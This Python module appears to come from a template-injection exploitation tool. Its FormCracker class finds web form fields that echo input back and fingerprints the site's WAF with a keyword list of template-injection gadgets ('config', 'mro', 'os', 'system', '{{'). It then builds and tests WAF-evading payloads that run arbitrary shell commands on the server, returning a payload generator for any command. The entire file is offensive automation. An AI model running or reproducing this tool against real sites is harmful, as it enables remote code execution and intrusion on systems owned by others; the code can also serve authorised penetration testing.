import random
from urllib.parse import urlparse
from collections import Counter, namedtuple
from functools import lru_cache
import logging

from . import form
from .requester import Requester
from .shell_cmd import exec_cmd_payload


logger = logging.getLogger("form_cracker")
Result = namedtuple("Result", "payload_generate_func input_field")


class FormCracker:
    dangerous_keywords = [
        "config", "self", "os", "class", "mro", "base", "request",
        "attr", "open", "system",
        "[", '"', "'", "_", ".", "+", "{{", "|",
        "0", "1", "2",
    ]
    test_cmd = "echo f3n  j1ng;"
    test_result = "f3n j1ng"

    def __init__(self, form, method="POST", inputs=None, url=None, action=None, requester=None, request_interval=0):
        self.url = url
        if form:
            self.form = form
        else:
            assert all(param is not None for param in [method, inputs, url]), \
                "[method, inputs, url] should not be None!"
            self.form = form.Form(
                method=method,
                inputs=inputs,
                action=action or urlparse(url)[2]
            )
        if requester:
            self.req = requester
        else:
            self.req = Requester(
                interval=request_interval
            )

    def vulunable_inputs(self):
        fill_dict = form.random_fill(self.form)
        r = self.req.request(
            **form.fill_form(
                self.url,
                self.form,
                form_inputs=fill_dict))
        assert r is not None
        return [
            k for k, v in fill_dict.items()
            if v in r.text
        ]

    def submit(self, inputs: dict):
        logger.info(f"submit {inputs}")
        if any(len(v) > 2048 for v in inputs.values()) and self.form["method"] == "GET":
            logger.warning(
                "some inputs are extremely long that the request might fail")
        return self.req.request(
            **form.fill_form(self.url, self.form, inputs))

    def waf_page_hash(self, input_field: str):
        resps = {
            keyword: self.submit({input_field: keyword * 3})
            for keyword in self.dangerous_keywords
        }
        hashes = [
            hash(r.text) for r in resps.values()
            if r is not None and r.status_code != 500
        ]
        return [pair[0] for pair in Counter(hashes).most_common(2)]

    def crack_inputs(self, input_field):
        logger.info(f"Testing {input_field}")

        waf_hashes = self.waf_page_hash(input_field)

        @lru_cache(100)
        def waf_func(value):
            r = self.submit({input_field: value})
            assert r is not None
            return hash(r.text) not in waf_hashes

        payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
        if payload is None:
            return None
        if will_echo:
            logger.warning(
                f"Input {input_field} looks great, testing generated payload.")
            r = self.submit({input_field: payload})
            assert r is not None
            if self.test_result in r.text:
                logger.warning(f"Success! return a payload generator.")
            else:
                logger.warning(
                    f"Test Payload Failed! return a payload generator anyway.")
            return Result(
                payload_generate_func=(
                    lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
                input_field=input_field
            )
        else:
            logger.warning(
                f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
                "You can try using the payload generator anyway.")
            return Result(
                payload_generate_func=(
                    lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
                input_field=input_field
            )

    def crack(self):
        logger.info(f"Start cracking {self.form}")
        vulunables = self.vulunable_inputs()
        logger.info(f"These inputs might be vulunable: {vulunables}")

        for input_field in vulunables:
            result = self.crack_inputs(input_field)
            if result:
                return result
        logger.warning(f"Failed...")
        return None
